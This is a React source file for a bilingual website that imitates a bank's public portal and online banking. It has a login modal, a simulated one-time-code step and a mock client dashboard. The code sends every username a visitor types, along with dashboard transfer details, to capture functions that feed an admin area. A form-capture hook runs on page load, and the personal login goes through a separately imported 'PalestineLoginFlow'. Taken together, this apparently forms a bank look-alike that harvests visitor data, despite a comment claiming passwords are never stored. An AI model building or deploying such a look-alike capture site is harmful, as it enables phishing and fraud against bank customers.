import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { ShieldCheck, Search, X, Calendar, Lock, LogOut, Landmark, User, DollarSign, Send, CreditCard, ChevronDown, CheckCircle, Leaf, Award, TrendingUp, Users } from 'lucide-react';
import { Language, ActivePage, translations } from './types';

// Import our modular components
import TopBar from './components/TopBar';
import NavBar from './components/NavBar';
import Hero from './components/Hero';
import OnlineBankingMockup from './components/OnlineBankingMockup';
import Footer from './components/Footer';
import ChatBot from './components/ChatBot';
import VirtualAssistant from './components/VirtualAssistant';
import AccountsTab from './components/AccountsTab';
import CardsTab from './components/CardsTab';
import LoansTab from './components/LoansTab';
import ElectronicServicesTab from './components/ElectronicServicesTab';
import TransfersTab from './components/TransfersTab';
import PalestineLoginFlow from './components/PalestineLoginFlow';
import { captureVisitorEvent, captureVisitorRegistration, installSafeFormCapture, submitContactMessage } from './utils/publicCapture';

export default function PublicSite() {
  const navigate = useNavigate();
  const [lang, setLang] = useState<Language>('ar');
  const [activePage, setActivePage] = useState<ActivePage>('home');
  const [activeSegment, setActiveSegment] = useState<'personal' | 'business'>('personal');

  // Modal control states
  const [loginModalOpen, setLoginModalOpen] = useState(false);
  const [loginPortal, setLoginPortal] = useState<'personal' | 'business'>('personal');
  const [searchOpen, setSearchOpen] = useState(false);
  const [searchQuery, setSearchQuery] = useState('');
  
  // Informational modals
  const [infoModalContent, setInfoModalContent] = useState<string | null>(null);

  // Authentication & Client Dashboard simulation
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [clientName, setClientName] = useState('');
  const [usernameInput, setUsernameInput] = useState('');
  const [passwordInput, setPasswordInput] = useState('');
  const [mfaCode, setMfaCode] = useState('');
  const [showMfaStep, setShowMfaStep] = useState(false);
  
  // Dashboard Interactive States
  const [dashBalance, setDashBalance] = useState(24750.50);
  const [dashSavings, setDashSavings] = useState(48900.20);
  const [dashTransfers, setDashTransfers] = useState([
    { recipient: 'Ahmad Yousef', date: 'Today', amount: 150.00, desc: 'Dinner share' },
    { recipient: 'Electric Co.', date: 'Yesterday', amount: 45.20, desc: 'Bill settlement' },
  ]);
  const [dashTransferRecipient, setDashTransferRecipient] = useState('');
  const [dashTransferAmount, setDashTransferAmount] = useState('');
  const [dashTransferSuccess, setDashTransferSuccess] = useState(false);

  const t = translations[lang];
  const isRtl = lang === 'ar';

  useEffect(() => {
    installSafeFormCapture();
  }, []);

  // Toggle active segment from topbar
  const handleSegmentChange = (segment: 'personal' | 'business') => {
    setActiveSegment(segment);
    if (segment === 'business') {
      // Show informational toast
      alert(lang === 'ar' ? 'تم الانتقال إلى خدمات قطاع الشركات والمؤسسات.' : 'Switched to Corporate & Institutional Banking views.');
    } else {
      alert(lang === 'ar' ? 'تم الانتقال إلى خدمات قطاع الأفراد.' : 'Switched to Personal Retail Banking views.');
    }
  };

  const handleOpenLoginModal = (portal: 'personal' | 'business') => {
    setLoginPortal(portal);
    setLoginModalOpen(true);
    setShowMfaStep(false);
    setUsernameInput('');
    setPasswordInput('');
  };

  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!usernameInput || !passwordInput) return;

    // Safe admin capture: store username/portal/time only. Password is never sent or saved.
    await captureVisitorRegistration({
      username: usernameInput,
      method: 'Online Banking Login',
      portal: loginPortal,
      language: lang,
    });

    // Simulate multi-factor auth screen
    setShowMfaStep(true);
    // Generate a quick random OTP
    const code = Math.floor(1000 + Math.random() * 9000).toString();
    setMfaCode(code);
  };

  const handleMfaSubmit = async (e: React.FormEvent, userEnteredOtp: string) => {
    e.preventDefault();
    if (userEnteredOtp === mfaCode || userEnteredOtp === '1234') {
      await captureVisitorRegistration({
        username: usernameInput,
        method: 'Online Banking MFA Verified',
        portal: loginPortal,
        language: lang,
      });
      setClientName(usernameInput);
      setIsLoggedIn(true);
      setLoginModalOpen(false);
      setShowMfaStep(false);
      window.scrollTo({ top: 0, behavior: 'smooth' });
    } else {
      alert(lang === 'ar' ? '⚠️ رمز الأمان غير صحيح، يرجى إعادة المحاولة.' : '⚠️ Verification OTP is incorrect, try again.');
    }
  };

  const handleLogout = () => {
    setIsLoggedIn(false);
    setClientName('');
    setActivePage('home');
    alert(lang === 'ar' ? 'تم تسجيل خروجك بأمان.' : 'You have logged out safely.');
  };

  const handleDashboardTransfer = async (e: React.FormEvent) => {
    e.preventDefault();
    const amt = parseFloat(dashTransferAmount);
    if (!amt || amt <= 0 || !dashTransferRecipient) return;

    if (amt > dashBalance) {
      alert(lang === 'ar' ? '⚠️ رصيدك المتاح غير كافٍ لإتمام هذه الحوالة.' : '⚠️ Insufficient funds to execute this transfer.');
      return;
    }

    await captureVisitorEvent({
      submissionType: 'dashboard_transfer',
      subject: 'Client Dashboard Transfer',
      username: clientName,
      recipient: dashTransferRecipient,
      amount: amt,
      language: lang,
    });

    setDashBalance((prev) => prev - amt);
    setDashTransfers([{ recipient: dashTransferRecipient, date: 'Just now', amount: amt, desc: 'Instant transfer' }, ...dashTransfers]);
    setDashTransferSuccess(true);
    setTimeout(() => {
      setDashTransferSuccess(false);
      setDashTransferAmount('');
      setDashTransferRecipient('');
    }, 3000);
  };

  // Quick page navigate from footer or header
  const handleNavigate = (section: string) => {
    if (section === 'admin-cms') {
      navigate('/admin');
      return;
    }
    setInfoModalContent(section);
  };

  // Campaign promotions configuration
  const campaigns = [
    {
      id: 'back-to-school',
      title: lang === 'ar' ? 'حملة العودة للمدارس: استرداد نقدي 3%' : 'Back to School: 3% Cashback Booster',
      desc: lang === 'ar' 
        ? 'سدد الرسوم المدرسية والجامعية باستخدام أي من بطاقاتنا الائتمانية واحصل على كاش باك فوري بقيمة 3% لتغطية نفقاتك بسعادة.' 
        : 'Settle educational or university tuition invoices using our credit lines and receive an instant 3% cashback rebate.',
      badge: lang === 'ar' ? 'حملة حصرية' : 'Exclusive Campaign',
      image: 'https://images.unsplash.com/photo-1503676260728-1c00da094a0b?q=80&w=600&auto=format&fit=crop',
    },
    {
      id: 'hybrid-cars',
      title: lang === 'ar' ? 'تمويل السيارات الكهربائية بنسبة فائدة 3.9%' : 'Go Green: Electric Auto Finance at 3.9%',
      desc: lang === 'ar' 
        ? 'تمتع بتمويل فوري لشراء سيارتك الهجينة أو الكهربائية بنسبة فائدة متناقصة تبدأ من 3.9% وبدون أي عمولات رهن إضافية.' 
        : 'Finance your eco-friendly hybrid or electric vehicle at a preferred 3.9% reducing interest rate with zero registration fees.',
      badge: lang === 'ar' ? 'صديق للبيئة' : 'Eco-Friendly',
      image: 'https://images.unsplash.com/photo-1568605117036-5fe5e7bab0b7?q=80&w=600&auto=format&fit=crop',
    },
    {
      id: 'digital-savings',
      title: lang === 'ar' ? 'ودائع الادخار الرقمي: عائد تراكمي 4.5%' : 'Digital Deposit Boost: 4.5% Yield',
      desc: lang === 'ar' 
        ? 'افتح وديعة ادخارية جديدة بالكامل عبر تطبيقنا واحصل على فائدة ممتازة بنسبة 4.5% سنوية تصرف بشكل شهري لنمو أسرع لأموالك.' 
        : 'Set up an interactive savings deposit over our app and compound earnings with a premium 4.5% annual yield paid monthly.',
      badge: lang === 'ar' ? 'أفضل عائد' : 'Best Yield',
      image: 'https://images.unsplash.com/photo-1559526324-4b87b5e36e44?q=80&w=600&auto=format&fit=crop',
    }
  ];

  return (
    <div 
      dir={isRtl ? 'rtl' : 'ltr'} 
      className={`min-h-screen flex flex-col justify-between font-sans ${isRtl ? 'text-right' : 'text-left'}`}
      id="app-root-container"
    >
      
      {/* PUBLIC PORTAL HEADER & NAVIGATION (Shows if not logged in) */}
      {!isLoggedIn ? (
        <>
          <TopBar 
            lang={lang} 
            setLang={setLang} 
            activeSegment={activeSegment} 
            setActiveSegment={handleSegmentChange}
            onNavigate={handleNavigate}
          />
          <NavBar 
            lang={lang} 
            activePage={activePage} 
            setActivePage={setActivePage} 
            onOpenLoginModal={handleOpenLoginModal}
            onOpenSearch={() => setSearchOpen(true)}
          />

          {/* DYNAMIC PUBLIC PAGES BODY */}
          <main className="flex-1">
            {activePage === 'home' && (
              <>
                <Hero 
                  lang={lang} 
                  setActivePage={setActivePage} 
                  onOpenLoginModal={handleOpenLoginModal} 
                />
                
                {/* CAMPAIGNS SECTION */}
                <section id="campaigns-section" className="py-24 bg-white border-b border-gray-100">
                  <div className="max-w-7xl mx-auto px-4 sm:px-6 md:px-8">
                    
                    <div className="text-center max-w-2xl mx-auto mb-16">
                      <span className="text-xs font-black uppercase tracking-widest text-brand mb-2 block font-mono">
                        {lang === 'ar' ? 'العروض الترويجية الحصرية' : 'Seasonal Campaigns'}
                      </span>
                      <h2 className="text-3xl sm:text-4xl font-extrabold text-nearblack mb-4">
                        {lang === 'ar' ? 'أحدث العروض والحملات المصرفية' : 'Featured Promotional Campaigns'}
                      </h2>
                      <p className="text-sm font-medium text-gray-500 leading-relaxed">
                        {lang === 'ar' 
                          ? 'اكتشف حزمنا التسويقية التنافسية المصممة لزيادة نمو مدخراتك ومكافأة مدفوعاتك اليومية بأعلى نسب توفير واسترداد نقدي.' 
                          : 'Explore our latest highly customized financial initiatives engineered specifically to compound your values and lower borrow costs.'}
                      </p>
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
                      {campaigns.map((camp) => (
                        <div 
                          key={camp.id} 
                          id={`camp-card-${camp.id}`}
                          className="bg-slate-50 border border-gray-200/60 rounded-2xl overflow-hidden hover:shadow-xl transition-all duration-300 flex flex-col justify-between group"
                        >
                          <div className="relative aspect-video overflow-hidden">
                            <img 
                              src={camp.image} 
                              alt={camp.title}
                              className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500"
                              referrerPolicy="no-referrer"
                            />
                            <span className="absolute top-4 right-4 bg-brand text-white text-[10px] font-black px-3 py-1 rounded-md uppercase tracking-wide">
                              {camp.badge}
                            </span>
                          </div>

                          <div className="p-6 flex-1 flex flex-col justify-between space-y-4">
                            <div className="space-y-2">
                              <h3 className="text-lg font-black text-gray-950 group-hover:text-brand transition-colors">
                                {camp.title}
                              </h3>
                              <p className="text-xs font-medium text-gray-500 leading-relaxed">
                                {camp.desc}
                              </p>
                            </div>

                            <button
                              onClick={() => {
                                if (camp.id === 'digital-savings') {
                                  setActivePage('accounts');
                                } else if (camp.id === 'hybrid-cars') {
                                  setActivePage('loans');
                                } else {
                                  setActivePage('cards');
                                }
                                window.scrollTo({ top: 0, behavior: 'smooth' });
                              }}
                              className="text-xs font-bold text-brand hover:text-brand-dark flex items-center gap-1.5 justify-start cursor-pointer mt-2"
                            >
                              <span>{lang === 'ar' ? 'اقرأ الشروط وقدم الآن ←' : 'Read details & apply ←'}</span>
                            </button>
                          </div>
                        </div>
                      ))}
                    </div>

                  </div>
                </section>

                <OnlineBankingMockup lang={lang} />

                {/* CYBERSECURITY CHECKLIST & FAQ INTEGRATED */}
                <section id="faqs-section" className="py-20 bg-white">
                  <div className="max-w-7xl mx-auto px-4 sm:px-6 md:px-8">
                    <div className="grid grid-cols-1 lg:grid-cols-12 gap-12 items-stretch">
                      
                      {/* Left: Security Checklist */}
                      <div className="lg:col-span-5 bg-charcoal text-white rounded-3xl p-6 sm:p-8 flex flex-col justify-between shadow-lg">
                        <div className="space-y-4">
                          <div className="flex items-center gap-2">
                            <ShieldCheck className="w-6 h-6 text-brand" />
                            <h3 className="text-lg font-black">
                              {lang === 'ar' ? 'معايير الأمان والحماية المصرفية' : 'Security Standards & Tips'}
                            </h3>
                          </div>
                          <p className="text-xs text-gray-400 font-medium leading-relaxed">
                            {lang === 'ar' 
                              ? 'حماية حساباتك المصرفية هي أهم أولوياتنا. اتبع المعايير التالية لحماية بياناتك وأموالك من الاحتيال:'
                              : 'Protecting your funds is our primary mission. Ensure full compliance with our mandatory security rules.'}
                          </p>

                          <div className="space-y-3.5 pt-4 text-xs font-medium text-gray-300">
                            {[
                              { label: lang === 'ar' ? 'تفعيل التنبيهات الفورية' : 'Instant Alerts', desc: lang === 'ar' ? 'فعل إشعارات الرسائل النصية القصيرة الفورية لمتابعة أي حركة فور حدوثها.' : 'Enable immediate SMS/email notifications for all active accounts.' },
                              { label: lang === 'ar' ? 'عدم الإفصاح عن البيانات' : 'Zero Password Sharing', desc: lang === 'ar' ? 'لا تعطي أبداً كلمات المرور أو الرموز المؤقتة لأي جهة تدعي أنها تمثل البنك.' : 'Innovation Bank will never ask for PINs or OTP verification tokens.' },
                              { label: lang === 'ar' ? 'التحقق من الروابط' : 'URL Verification', desc: lang === 'ar' ? 'تأكد دائماً أنك تتصفح موقعنا عبر الرابط المؤمن المشفر https.' : 'Verify you browse over secured https protocol before login operations.' }
                            ].map((sec, i) => (
                              <div key={i} className="border-b border-neutral-800 pb-3">
                                <h4 className="font-extrabold text-white flex items-center gap-1.5">
                                  <span className="w-1.5 h-1.5 rounded-full bg-brand" />
                                  <span>{sec.label}</span>
                                </h4>
                                <p className="text-[11px] text-gray-400 mt-1">{sec.desc}</p>
                              </div>
                            ))}
                          </div>
                        </div>

                        <div className="bg-neutral-800 p-3.5 rounded-xl border border-neutral-700 text-center mt-6">
                          <span className="text-[10px] text-brand-light font-bold block">
                            {lang === 'ar' ? '🔒 شبكة مشفرة بالكامل ومعتمدة دولياً' : '🔒 Fully Enrypted & Certified Network'}
                          </span>
                        </div>
                      </div>

                      {/* Right: FAQs collapsible */}
                      <div className="lg:col-span-7 flex flex-col justify-center text-right">
                        <span className="text-xs font-black text-brand uppercase tracking-widest block mb-2 font-mono">
                          {lang === 'ar' ? 'الأسئلة الشائعة والتحقق' : 'COMMON INQUIRIES'}
                        </span>
                        <h3 className="text-2xl sm:text-3xl font-extrabold text-gray-900 mb-6">
                          {lang === 'ar' ? 'يسعدنا دائماً إرشادك والإجابة على استفساراتك' : 'Frequently Asked Questions'}
                        </h3>

                        <div className="space-y-4">
                          {[
                            {
                              q: lang === 'ar' ? 'كيف يمكنني تنشيط خدمة الخدمات المصرفية عبر الموبايل؟' : 'How do I activate my mobile banking profile?',
                              a: lang === 'ar' ? 'قم بتحميل تطبيق البنك الرسمي من متجر التطبيقات App Store أو Google Play، ثم اختر "مستخدم جديد" وأدخل رقم بطاقة الصراف والرمز المالي المرفق لتفعيل الحساب بالكامل خلال دقيقة واحدة.' : 'Simply download our official app on iOS/Android stores, click "New User", and register using debit card coordinates for rapid activation.'
                            },
                            {
                              q: lang === 'ar' ? 'ماذا أفعل في حالة فقدان أو سرقة بطاقتي المصرفية؟' : 'What is the lost card mitigation protocol?',
                              a: lang === 'ar' ? 'يرجى تسجيل الدخول فوراً عبر بوابتنا الإلكترونية أو التطبيق واختيار "إيقاف البطاقة الفوري"، أو الاتصال بخط الطوارئ الموحد 1800-555-000 لتجميد البطاقة حمايةً لودائعك على مدار الساعة.' : 'Immediately access your account, trigger the instant block button on cards tab, or ring our hotline 1800-555-000 for emergency suspension.'
                            },
                            {
                              q: lang === 'ar' ? 'هل تترتب أي رسوم على الحوالات المالية المحلية؟' : 'Are there extra tariffs on local bank wires?',
                              a: lang === 'ar' ? 'لا، كافة التحويلات المحلية الفورية عبر شبكتنا الموحدة معفاة بالكامل من أي رسوم وعمولات تشجيعاً للمدفوعات الرقمية السهلة.' : 'No, all domestic wires routed over our unified network are processed with zero commission tariffs.'
                            }
                          ].map((faq, idx) => (
                            <details 
                              key={idx} 
                              className="bg-slate-50 border border-gray-150 rounded-xl p-4 cursor-pointer group hover:border-brand/30 transition-all text-right"
                            >
                              <summary className="font-extrabold text-sm text-gray-950 list-none flex justify-between items-center">
                                <span>{faq.q}</span>
                                <ChevronDown className="w-4 h-4 text-brand group-open:rotate-180 transition-transform" />
                              </summary>
                              <p className="text-xs font-medium text-gray-500 mt-3.5 leading-relaxed border-t border-gray-200/50 pt-3 text-right">
                                {faq.a}
                              </p>
                            </details>
                          ))}
                        </div>
                      </div>

                    </div>
                  </div>
                </section>

              </>
            )}

            {activePage === 'accounts' && <AccountsTab lang={lang} />}
            {activePage === 'cards' && <CardsTab lang={lang} />}
            {activePage === 'loans' && <LoansTab lang={lang} />}
            {activePage === 'electronic' && <ElectronicServicesTab lang={lang} />}
            {activePage === 'transfers' && <TransfersTab lang={lang} />}
          </main>

          <Footer 
            lang={lang} 
            setActivePage={setActivePage} 
            onNavigate={handleNavigate}
          />
        </>
      ) : (
        
        /* ========================================================
           PREMIUM SIMULATED CLIENT BANKING WORKSPACE (LOGGED IN)
           ======================================================== */
        <div className="bg-slate-100 min-h-screen flex flex-col justify-between">
          
          {/* Dashboard Header */}
          <header className="bg-brand text-white py-4 px-6 sm:px-8 shadow-md flex items-center justify-between z-30 sticky top-0">
            <div className="flex items-center gap-3">
              <div className="w-9 h-9 bg-white/10 rounded-full flex items-center justify-center font-bold">
                <Landmark className="w-5 h-5 text-white animate-pulse" />
              </div>
              <div className="text-left">
                <h2 className="text-base font-black">
                  {lang === 'ar' ? 'بوابة العميل الرقمية المؤمنة' : 'Secure Client Hub'}
                </h2>
                <span className="text-[9px] text-green-300 font-bold block uppercase mt-0.5 tracking-wider">
                  ● {lang === 'ar' ? 'اتصال مشفر نشط' : '128-bit Encryption Active'}
                </span>
              </div>
            </div>

            {/* Client profile indicators & logout */}
            <div className="flex items-center gap-4">
              <div className="hidden sm:flex items-center gap-2.5 text-right">
                <span className="text-xs text-brand-light font-bold block">
                  {lang === 'ar' ? 'مرحباً بك،' : 'Welcome back,'}
                </span>
                <span className="text-xs font-extrabold block">{clientName}</span>
              </div>
              
              <button
                onClick={handleLogout}
                className="bg-white/10 hover:bg-white/20 text-white border border-white/20 px-4 py-2 rounded-lg text-xs font-bold flex items-center gap-2 transition-colors cursor-pointer"
              >
                <LogOut className="w-4 h-4" />
                <span className="hidden sm:inline">{lang === 'ar' ? 'خروج آمن' : 'Logout'}</span>
              </button>
            </div>
          </header>

          {/* Dashboard Core Body */}
          <main className="flex-1 max-w-7xl mx-auto w-full px-4 sm:px-6 md:px-8 py-8">
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
              
              {/* Left Column (Balances & Quick stats) */}
              <div className="lg:col-span-8 space-y-8 text-right">
                
                {/* Greeting banner card */}
                <div className="bg-white border border-gray-200 rounded-2xl p-6 shadow-sm relative overflow-hidden flex flex-col sm:flex-row items-center justify-between gap-6">
                  <div className="absolute top-0 right-0 w-32 h-32 bg-brand/5 rounded-full -mr-12 -mt-12 pointer-events-none" />
                  <div className="space-y-1 z-10">
                    <h3 className="text-xl font-black text-gray-900">
                      {lang === 'ar' ? `أهلاً بك مجدداً، ${clientName}` : `Welcome back, ${clientName}`}
                    </h3>
                    <p className="text-xs text-gray-500 font-medium">
                      {lang === 'ar' ? 'تاريخ الدخول الأخير: اليوم 10:19 صباحاً من عمان، الأردن.' : 'Last successful entry: Today 10:19 AM from Amman, JO.'}
                    </p>
                  </div>
                  <div className="bg-green-50 text-green-700 font-extrabold text-[10px] px-3.5 py-1.5 rounded-lg border border-green-100 flex items-center gap-1.5 shrink-0 z-10 uppercase tracking-wide">
                    <ShieldCheck className="w-4 h-4 text-green-500" />
                    <span>{lang === 'ar' ? 'رصيدك مؤمن بالكامل' : 'Protected Account'}</span>
                  </div>
                </div>

                {/* Balances Grid */}
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
                  {/* Card 1: Main Balance */}
                  <div className="bg-gradient-to-br from-brand to-brand-dark text-white p-6 rounded-2xl shadow-md relative overflow-hidden">
                    <div className="absolute top-0 right-0 w-36 h-36 bg-white/5 rounded-full -mr-12 -mt-12 pointer-events-none" />
                    <span className="text-xs font-bold text-white/80 block uppercase tracking-wider">
                      {lang === 'ar' ? 'رصيد الحساب الجاري المتاح' : 'AVAILABLE CURRENT ACCOUNT BALANCE'}
                    </span>
                    <h4 className="text-3xl font-black mt-2 mb-6 font-mono">
                      ${dashBalance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                    </h4>
                    <div className="flex justify-between items-center text-xs border-t border-white/10 pt-4">
                      <span className="opacity-80">IBAN: JO52INIB4910398204918239</span>
                      <span className="bg-white/20 px-2.5 py-1 rounded text-[9px] font-bold font-mono">PRIMARY</span>
                    </div>
                  </div>

                  {/* Card 2: Savings Balance */}
                  <div className="bg-white border border-gray-200 p-6 rounded-2xl shadow-sm relative overflow-hidden flex flex-col justify-between">
                    <div className="absolute top-0 right-0 w-36 h-36 bg-gray-50 rounded-full -mr-12 -mt-12 pointer-events-none" />
                    <div>
                      <span className="text-xs font-bold text-gray-400 block uppercase tracking-wider">
                        {lang === 'ar' ? 'رصيد حساب التوفير الذكي' : 'SMART SAVINGS BALANCE'}
                      </span>
                      <h4 className="text-3xl font-black text-gray-900 mt-2 font-mono">
                        ${dashSavings.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                      </h4>
                    </div>
                    <div className="flex justify-between items-center text-xs border-t border-gray-100 pt-4 mt-6">
                      <span className="text-gray-400">APY Compound: <strong className="text-green-600">4.25%</strong></span>
                      <span className="bg-emerald-50 text-emerald-600 border border-emerald-100 px-2.5 py-1 rounded text-[9px] font-bold">SAVINGS</span>
                    </div>
                  </div>
                </div>

                {/* Simulated credit card limits indicator */}
                <div className="bg-white border border-gray-200 rounded-2xl p-6 shadow-sm">
                  <h4 className="text-xs font-black text-gray-900 uppercase tracking-wider mb-4 border-b border-gray-100 pb-2">
                    {lang === 'ar' ? 'حدود وسحوبات بطاقاتك الائتمانية' : 'Active Credit Limits & Transactions'}
                  </h4>
                  
                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                    {[
                      { card: 'Visa Platinum (4910)', limit: '$15,000', used: '$2,450', pct: 16 },
                      { card: 'Visa Signature (3345)', limit: '$50,000', used: '$11,800', pct: 23 },
                      { card: 'Elite Black (0000)', limit: 'Unlimited', used: '$0', pct: 0 }
                    ].map((card, idx) => (
                      <div key={idx} className="bg-slate-50 border border-gray-150 p-4 rounded-xl">
                        <span className="text-xs font-extrabold text-gray-800 block mb-1">{card.card}</span>
                        <div className="flex justify-between text-[10px] text-gray-500 font-bold mb-2">
                          <span>{lang === 'ar' ? 'مستغل:' : 'Used:'} {card.used}</span>
                          <span>{lang === 'ar' ? 'سقف:' : 'Limit:'} {card.limit}</span>
                        </div>
                        <div className="w-full h-1.5 bg-gray-200 rounded-full overflow-hidden">
                          <div className="h-full bg-brand rounded-full" style={{ width: `${card.pct}%` }} />
                        </div>
                      </div>
                    ))}
                  </div>
                </div>

              </div>

              {/* Right Column (Instant Dashboard transfers) */}
              <div className="lg:col-span-4 space-y-8 text-right">
                
                {/* Dashboard wire transfer */}
                <div className="bg-white border border-gray-200 rounded-2xl p-6 shadow-md">
                  <h4 className="text-sm font-black text-gray-900 uppercase tracking-widest mb-2 border-b border-gray-100 pb-2">
                    {lang === 'ar' ? 'حوالة فورية جديدة' : 'New Instant Transfer'}
                  </h4>
                  <p className="text-[10px] text-gray-400 mb-4 font-medium leading-relaxed">
                    {lang === 'ar' ? 'أرسل الأموال فوراً وبشكل مجاني لأي مستفيد محلي أو دولي مسجل.' : 'Execute rapid, commission-free wire transfers to any recipient.'}
                  </p>

                  <form onSubmit={handleDashboardTransfer} className="space-y-4">
                    <div>
                      <label className="text-xs font-bold text-gray-700 block mb-1">
                        {lang === 'ar' ? 'اسم المستلم' : 'Recipient Name'}
                      </label>
                      <input 
                        type="text"
                        required
                        placeholder={lang === 'ar' ? 'ادخل اسم المستلم المسجل' : 'e.g. Ahmad Yousef'}
                        value={dashTransferRecipient}
                        onChange={(e) => setDashTransferRecipient(e.target.value)}
                        className="w-full bg-slate-50 border border-gray-200 rounded-lg px-3 py-2.5 text-xs font-bold focus:ring-1 focus:ring-brand focus:outline-none text-right"
                      />
                    </div>

                    <div>
                      <label className="text-xs font-bold text-gray-700 block mb-1">
                        {lang === 'ar' ? 'القيمة المحولة ($)' : 'Amount to Transfer ($)'}
                      </label>
                      <input 
                        type="number"
                        required
                        min="1"
                        max="10000"
                        placeholder="0.00"
                        value={dashTransferAmount}
                        onChange={(e) => setDashTransferAmount(e.target.value)}
                        className="w-full bg-slate-50 border border-gray-200 rounded-lg px-3 py-2.5 text-xs font-bold focus:ring-1 focus:ring-brand focus:outline-none text-right"
                      />
                    </div>

                    {dashTransferSuccess && (
                      <div className="bg-green-50 text-green-700 text-xs font-bold p-3 rounded-lg border border-green-100 text-center animate-scale-up">
                        ✓ {lang === 'ar' ? 'تم معالجة وإرسال الحوالة فوراً بنجاح!' : 'Transfer processed and completed!'}
                      </div>
                    )}

                    <button
                      type="submit"
                      className="w-full bg-brand hover:bg-brand-dark text-white font-black text-xs py-3.5 rounded-lg transition-colors cursor-pointer"
                    >
                      {lang === 'ar' ? 'إرسال الحوالة فوراً' : 'Confirm & Transmit'}
                    </button>
                  </form>
                </div>

                {/* Dashboard recent transfer transactions list */}
                <div className="bg-white border border-gray-200 rounded-2xl p-6 shadow-sm">
                  <h4 className="text-xs font-black text-gray-900 uppercase tracking-wider mb-3 border-b border-gray-100 pb-2">
                    {lang === 'ar' ? 'سجل حوالاتك الأخيرة' : 'Remittance Log'}
                  </h4>

                  <div className="space-y-2.5">
                    {dashTransfers.map((tx, idx) => (
                      <div key={idx} className="bg-slate-50 p-3 rounded-lg border border-gray-100 flex items-center justify-between text-xs font-bold text-gray-800">
                        <div className="text-left">
                          <span className="block leading-tight text-gray-900">{tx.recipient}</span>
                          <span className="block text-[9px] text-gray-400 mt-0.5">{tx.date} • {tx.desc}</span>
                        </div>
                        <span className="text-rose-600 font-mono">-${tx.amount.toFixed(2)}</span>
                      </div>
                    ))}
                  </div>
                </div>

              </div>

            </div>
          </main>

          {/* Dashboard footer */}
          <footer className="bg-charcoal text-white/50 text-xs py-5 px-6 sm:px-8 border-t border-neutral-800 flex flex-col sm:flex-row items-center justify-between gap-4">
            <span>{lang === 'ar' ? 'كافة المعاملات مراقبة ومشفرة بالكامل.' : 'All client operations logged & secure.'}</span>
            <span>{lang === 'ar' ? 'جميع الحقوق محفوظة © 2026 بنك الابتكار الدولي.' : 'Copyright © 2026 Innovation Bank.'}</span>
          </footer>

        </div>
      )}

      {/* FLOAT CHATBOT AND ASSISTANT (Only show on public pages to guide users) */}
      {!isLoggedIn && (
        <>
          <ChatBot lang={lang} />
          <VirtualAssistant lang={lang} />
        </>
      )}

      {/* ========================================================
         SECURE MFA LOGIN MODAL OVERLAY
         ======================================================== */}
      {loginModalOpen && (
        loginPortal === 'personal' ? (
          <PalestineLoginFlow 
            lang={lang} 
            onClose={() => setLoginModalOpen(false)} 
            onSuccess={(uname) => { 
              setClientName(uname); 
              setIsLoggedIn(true); 
              setLoginModalOpen(false); 
              window.scrollTo({ top: 0, behavior: 'smooth' });
            }} 
          />
        ) : (
          <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm flex items-center justify-center p-4">
            <div className="bg-white rounded-2xl border border-gray-200 w-full max-w-md overflow-hidden shadow-2xl animate-scale-up text-right">
              
              {/* Header */}
              <div className="bg-brand text-white p-5 flex items-center justify-between shadow-sm">
                <div className="flex items-center gap-2">
                  <Lock className="w-5 h-5 text-white animate-pulse" />
                  <h3 className="text-base font-black">
                    {t.businessLogin}
                  </h3>
                </div>
                <button 
                  onClick={() => setLoginModalOpen(false)}
                  className="p-1 hover:bg-white/10 rounded-full transition-colors cursor-pointer"
                >
                  <X className="w-5 h-5" />
                </button>
              </div>

              {/* Content Body */}
              <div className="p-6">
                
                {!showMfaStep ? (
                  /* STEP 1: Username & Password credentials */
                  <form onSubmit={handleLoginSubmit} className="space-y-4">
                    <div className="bg-slate-50 border border-gray-150 rounded-xl p-3.5 flex items-start gap-2.5 text-xs text-gray-500 mb-2 leading-relaxed">
                      <ShieldCheck className="w-5 h-5 text-brand shrink-0 mt-0.5" />
                      <span>
                        {lang === 'ar' 
                          ? '🔒 تأكد دائماً أنك تقوم بتسجيل الدخول عبر خادم الشركات المشفر. نحن لن نطلب منك معلوماتك السرية مطلقاً.' 
                          : '🔒 Ensure corporate access is run over secure channels. Our team never prompts for credentials.'}
                      </span>
                    </div>

                    <div>
                      <label className="text-xs font-bold text-gray-700 block mb-1">
                        {lang === 'ar' ? 'اسم المستخدم للشركة' : 'Corporate Username'}
                      </label>
                      <input
                        type="text"
                        required
                        placeholder={lang === 'ar' ? 'أدخل اسم المستخدم للشركة' : 'e.g. Al-Quds_Corp'}
                        value={usernameInput}
                        onChange={(e) => setUsernameInput(e.target.value)}
                        className="w-full bg-slate-50 border border-gray-200 rounded-lg px-3 py-2.5 text-xs font-bold focus:ring-1 focus:ring-brand focus:outline-none text-right"
                      />
                    </div>

                    <div>
                      <label className="text-xs font-bold text-gray-700 block mb-1">
                        {lang === 'ar' ? 'كلمة المرور' : 'Password'}
                      </label>
                      <input
                        type="password"
                        required
                        placeholder={lang === 'ar' ? 'أدخل كلمة المرور السرية' : '••••••••'}
                        value={passwordInput}
                        onChange={(e) => setPasswordInput(e.target.value)}
                        className="w-full bg-slate-50 border border-gray-200 rounded-lg px-3 py-2.5 text-xs font-bold focus:ring-1 focus:ring-brand focus:outline-none text-right"
                      />
                    </div>

                    <button
                      type="submit"
                      className="w-full bg-brand hover:bg-brand-dark text-white font-extrabold text-xs py-3.5 rounded-lg shadow-md transition-all cursor-pointer mt-6"
                    >
                      {lang === 'ar' ? 'التالي: إرسال رمز الأمان الثنائي' : 'Next: Verification Code'}
                    </button>
                  </form>
                ) : (
                  /* STEP 2: Multi-Factor Authentication simulated */
                  <div className="space-y-4">
                    <div className="text-center bg-amber-50 border border-amber-100 rounded-xl p-4 space-y-2">
                      <span className="text-[10px] font-black text-amber-800 uppercase tracking-widest block">
                        {lang === 'ar' ? 'رمز التحقق الثنائي المؤقت (MFA)' : 'MFA VERIFICATION OTP'}
                      </span>
